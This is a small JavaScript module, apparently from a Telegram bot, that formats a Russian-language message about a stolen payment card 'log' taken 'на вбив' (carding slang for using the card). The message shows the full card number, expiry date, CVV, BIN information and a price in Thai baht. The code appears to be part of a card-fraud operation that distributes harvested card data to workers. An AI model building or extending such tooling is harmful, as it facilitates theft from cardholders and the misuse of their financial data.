const binInfoEdit = require("./binInfoEdit");

module.exports = async (log) => {
    return `🥷 <b>Вы взяли лог #id${log.id} на вбив</b>
    
💳 <b>Номер карты:</b> <code>${log.cardNumber}</code>
📅 <b>Срок действия:</b> <code>${log.cardExp}</code>
🔒 <b>CVV:</b> <code>${log.cardCvv}</code>
    ${await binInfoEdit(log.cardNumber.replace(/\s/g, ""))}
💰 <b>Стоимость:</b> ${log.price == null ? '[Не указана]' : `${log.price} THB`}`;
};